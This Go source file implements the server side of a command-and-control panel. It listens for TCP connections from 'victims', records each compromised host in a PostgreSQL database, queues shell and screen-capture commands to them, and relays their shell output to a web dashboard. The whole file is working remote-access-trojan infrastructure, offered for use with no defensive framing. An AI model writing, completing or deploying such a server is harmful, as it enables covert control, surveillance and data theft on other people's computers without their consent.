package c2server

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"c2-control-panel/websocket"
)

type VictimSession struct {
	ID         string
	Conn       net.Conn
	Info       map[string]string
	LastSeen   time.Time
	CommandCh  chan *Packet
	ResponseCh chan *Packet
}

type Server struct {
	Address string
	DB      *sql.DB
	Hub     *websocket.Hub
	Victims map[string]*VictimSession
	mu      sync.RWMutex
}

func NewServer(address string, db *sql.DB, hub *websocket.Hub) *Server {
	return &Server{
		Address: address,
		DB:      db,
		Hub:     hub,
		Victims: make(map[string]*VictimSession),
	}
}

func (s *Server) Start() error {
	log.Printf("[C2] Starting TCP listener on %s...", s.Address)
	listener, err := net.Listen("tcp", s.Address)
	if err != nil {
		log.Printf("[C2] Failed to bind to %s: %v", s.Address, err)
		return err
	}
	defer listener.Close()

	log.Printf("[C2] Successfully listening on %s", s.Address)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("[C2] Accept error: %v", err)
			continue
		}

		go s.handleConnection(conn)
	}
}

func (s *Server) handleConnection(conn net.Conn) {
	victimID := conn.RemoteAddr().String()
	now := time.Now()
	log.Printf("[C2] New connection: %s", victimID)

	session := &VictimSession{
		ID:         victimID,
		Conn:       conn,
		Info:       make(map[string]string),
		LastSeen:   now,
		CommandCh:  make(chan *Packet, 10),
		ResponseCh: make(chan *Packet, 10),
	}

	s.mu.Lock()
	s.Victims[victimID] = session
	s.mu.Unlock()

	// Persist victim record
	s.saveVictim(session, now)

	// Notify dashboard
	s.Hub.Broadcast <- []byte(`{"type":"victim_connected","id":"` + victimID + `"}`)

	// Handle packets from victim
	go s.handleIncoming(session)

	// Handle commands to victim
	s.handleOutgoing(session)

	// Cleanup on disconnect
	s.mu.Lock()
	delete(s.Victims, victimID)
	s.mu.Unlock()

	s.Hub.Broadcast <- []byte(`{"type":"victim_disconnected","id":"` + victimID + `"}`)
	log.Printf("[C2] Disconnected: %s", victimID)
}

func (s *Server) saveVictim(session *VictimSession, firstSeen time.Time) {
	// Insert or update victim in PostgreSQL
	extraData, _ := json.Marshal(session.Info)
	
	query := `
		INSERT INTO victims (id, hostname, ip_address, first_seen, last_seen, status, extra_data)
		VALUES ($1, $2, $3, $4, $5, $6, $7)
		ON CONFLICT (id) DO UPDATE SET
			last_seen = $5,
			status = $6,
			extra_data = $7
	`
	
	_, err := s.DB.Exec(query, 
		session.ID,
		session.Info["hostname"],
		session.ID, // ip_address
		firstSeen,
		time.Now(), // last_seen
		"connected",
		extraData,
	)
	
	if err != nil {
		log.Printf("[C2] Failed to save victim %s: %v", session.ID, err)
	}
}

func (s *Server) logCommand(victimID string, output []byte) {
	// Insert command response into PostgreSQL
	query := `
		INSERT INTO commands (victim_id, command, response, sent_at, responded_at, status)
		VALUES ($1, $2, $3, $4, $5, $6)
	`
	
	_, err := s.DB.Exec(query,
		victimID,
		"", // command text (empty for shell output)
		string(output),
		time.Now(),
		time.Now(),
		"completed",
	)
	
	if err != nil {
		log.Printf("[C2] Failed to log command for %s: %v", victimID, err)
	}
}

func (s *Server) handleIncoming(session *VictimSession) {
	for {
		packet, err := ReadPacket(session.Conn)
		if err != nil {
			log.Printf("[C2] Read error from %s: %v", session.ID, err)
			session.Conn.Close()
			return
		}

		session.LastSeen = time.Now()

		switch packet.Opcode {
		case CmdHello:
			log.Printf("[C2] Hello from %s: %s", session.ID, string(packet.Data))
			session.Info["hello"] = string(packet.Data)

		case CmdShell:
			log.Printf("[C2] Shell output from %s (%d bytes)", session.ID, len(packet.Data))
			s.logCommand(session.ID, packet.Data)
			// Send to dashboard via WebSocket
			msg := `{"type":"shell_output","id":"` + session.ID + `","output":"` + string(packet.Data) + `"}`
			s.Hub.Broadcast <- []byte(msg)

		case CmdScreenFrame:
			log.Printf("[C2] Screen frame from %s (%d bytes)", session.ID, len(packet.Data))
			// Handle screen frame

		default:
			log.Printf("[C2] Unknown opcode %d from %s", packet.Opcode, session.ID)
		}
	}
}

func (s *Server) handleOutgoing(session *VictimSession) {
	for packet := range session.CommandCh {
		err := WritePacket(session.Conn, packet.Opcode, packet.Data)
		if err != nil {
			log.Printf("[C2] Write error to %s: %v", session.ID, err)
			session.Conn.Close()
			return
		}
	}
}

func (s *Server) SendCommand(victimID string, opcode uint8, data []byte) error {
	s.mu.RLock()
	session, exists := s.Victims[victimID]
	s.mu.RUnlock()

	if !exists {
		return ErrVictimNotFound
	}

	packet := &Packet{
		Opcode: opcode,
		Data:   data,
	}

	select {
	case session.CommandCh <- packet:
		return nil
	default:
		return ErrCommandQueueFull
	}
}

func (s *Server) GetVictims() []*VictimSession {
	s.mu.RLock()
	defer s.mu.RUnlock()

	victims := make([]*VictimSession, 0, len(s.Victims))
	for _, v := range s.Victims {
		victims = append(victims, v)
	}
	return victims
}

func (s *Server) Disconnect(victimID string) error {
	s.mu.RLock()
	session, exists := s.Victims[victimID]
	s.mu.RUnlock()

	if !exists {
		return ErrVictimNotFound
	}

	return session.Conn.Close()
}

var (
	ErrVictimNotFound  = fmt.Errorf("victim not found")
	ErrCommandQueueFull = fmt.Errorf("command queue full")
)